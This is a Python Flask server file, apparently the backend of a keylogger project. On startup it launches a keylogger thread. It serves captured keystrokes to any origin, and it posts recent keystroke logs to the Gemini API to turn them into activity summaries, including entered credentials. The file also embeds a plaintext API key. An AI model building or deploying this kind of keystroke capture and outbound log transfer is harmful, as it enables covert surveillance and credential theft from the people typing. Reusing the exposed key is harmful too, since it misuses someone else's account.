from flask import Flask, jsonify
from detector import detect
import os
from keylogger import start_keylogger
from flask_cors import CORS
import psutil
import requests

app = Flask(__name__)
CORS(app)

GEMINI_API_KEY = "AIzaSyBkfKBsh9fWtvCGs6QRYlla9C6ugsySlXE"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro-latest:generateContent?key=" + GEMINI_API_KEY
GEMINI_PROMPT = "Summarize this keylog into a human-readable activity description with timestamps. Example: 'User typed URL, then entered login credentials.'"

@app.route('/log', methods=['GET'])
def get_log():
    log_path = os.path.join(os.path.dirname(__file__), 'logs.txt')
    if not os.path.exists(log_path):
        return jsonify({'error': 'logs.txt not found'}), 404
    with open(log_path, 'r') as f:
        content = f.read()
    return jsonify({'log': content})

@app.route('/log-summary', methods=['GET'])
def log_summary():
    log_path = os.path.join(os.path.dirname(__file__), 'logs.txt')
    if not os.path.exists(log_path):
        return jsonify({'error': 'logs.txt not found'}), 404
    with open(log_path, 'r') as f:
        log_lines = f.readlines()
    if not log_lines:
        return jsonify({'summary': 'No keystrokes to summarize.'})
    # Limit to last 100 lines for Gemini processing
    last_lines = log_lines[-100:]
    safe_log_content = ''.join(last_lines).replace('"', "'")
    payload = {
        "contents": [{
            "parts": [
                {"text": f"{GEMINI_PROMPT}\n\n{safe_log_content}"}
            ]
        }]
    }
    try:
        response = requests.post(GEMINI_API_URL, json=payload, timeout=30)
        response.raise_for_status()
        gemini_data = response.json()
        summary = gemini_data.get('candidates', [{}])[0].get('content', {}).get('parts', [{}])[0].get('text', 'No summary returned.')
        return jsonify({'summary': summary})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/detect', methods=['GET'])
def detect_endpoint():
    result = detect()
    return jsonify(result)

@app.route('/system', methods=['GET'])
def system_info():
    cpu = psutil.cpu_percent(interval=0.5)
    ram = psutil.virtual_memory().percent
    process_count = len(psutil.pids())
    return jsonify({
        'cpu': cpu,
        'ram': ram,
        'process_count': process_count
    })

if __name__ == '__main__':
    from threading import Thread
    from keylogger import start_keylogger
    Thread(target=start_keylogger, daemon=True).start()
    app.run(debug=True, port=5001) 